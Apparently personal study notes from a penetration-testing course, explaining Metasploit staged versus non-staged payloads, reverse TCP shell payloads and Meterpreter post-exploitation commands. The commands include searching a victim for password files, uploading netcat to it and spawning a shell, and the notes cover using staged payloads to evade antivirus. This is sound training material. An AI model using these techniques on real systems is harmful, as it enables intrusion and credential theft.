Metasploit - Payloads

Info:

Non-staged payloads: sent in its entirety in one go. 

Staged payloads: 

Sent in two parts:
	•	
	•	The first part is a small primary payload which causes the victim to connect back to the attacker and accept the secondary payloads
	•	The secondary payload contains the rest of the shellcode 
	•	
	•	
This can be useful when:
	•	The vulnerability we are exploiting does not have enough buffer space to hold a full payload. As the first part of a staged payload is typically smaller than a full payload, these smaller payloads can often save us in tight situations.
	•	Antivirus software is detecting embedded shellcode in an exploit. By replacing the embedded shellcode with a staged payload, we will be removing most of the malicious part of the shellcode and injecting it directly into the victim machine memory.
	•	
	•	
	•	
	•	
These can be told apart when choosing a payload by looking for the following: 

windows/shell_reverse_tcp - Connect back to attacker and spawn a command shell 

windows/shell/reverse_tcp - Connect back to attacker, Spawn cmd shell (staged)



Meterpreter Payload:

Info: 

- Selected by default
- Staged payload - the second part is a DLL file that is injected directly into memory - as it never touches the victim's file system, it is less likely to be caught by anti-virus. 

Commands

meterpreter > sysinfo

meterpreter > getuid

meterpreter > search -f *pass*.txt

meterpreter > upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec

meterpreter > download c:\\Windows\\system32\\calc.exe /tmp/calc.exe

meterpreter > shell

Note: exiting out the spaned shell will return back to the meterpreter session. 











